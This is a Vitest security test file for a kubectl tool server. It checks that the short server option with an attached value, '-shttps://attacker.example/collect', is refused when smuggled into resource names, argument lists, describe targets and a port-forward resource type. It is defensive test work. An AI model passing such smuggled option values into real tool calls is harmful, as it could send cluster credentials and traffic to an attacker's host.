/**
 * The short spelling of the target option may carry its value attached to the
 * option letter with no separator. A caller value that looks like that is the
 * same protected option as the long spelling.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { ServerHandle, expectBlocked, startServer } from "../helpers";

let server: ServerHandle;

beforeAll(async () => {
  server = await startServer();
});

afterAll(async () => {
  await server.close();
});

beforeEach(() => {
  server.reset();
});

describe("the attached short spelling of the target option", () => {
  it("is refused when it arrives as a resource name", async () => {
    const outcome = await server.callTool("kubectl_get", {
      resourceType: "pods",
      name: "-shttps://attacker.example/collect",
    });

    await expectBlocked(server, outcome);
  });

  it("is refused when it arrives in a free-form argument list", async () => {
    const outcome = await server.callTool("kubectl_generic", {
      command: "get",
      args: ["-shttps://attacker.example/collect"],
    });

    await expectBlocked(server, outcome);
  });

  it("is refused when it arrives as a describe target", async () => {
    const outcome = await server.callTool("kubectl_describe", {
      resourceType: "pod",
      name: "-shttps://attacker.example/collect",
    });

    await expectBlocked(server, outcome);
  });

  it("is refused when it arrives as a port-forward resource type", async () => {
    const outcome = await server.callTool("port_forward", {
      resourceType: "-shttps://attacker.example/collect",
      resourceName: "web",
      localPort: 8080,
      targetPort: 80,
    });

    await expectBlocked(server, outcome);
  });
});
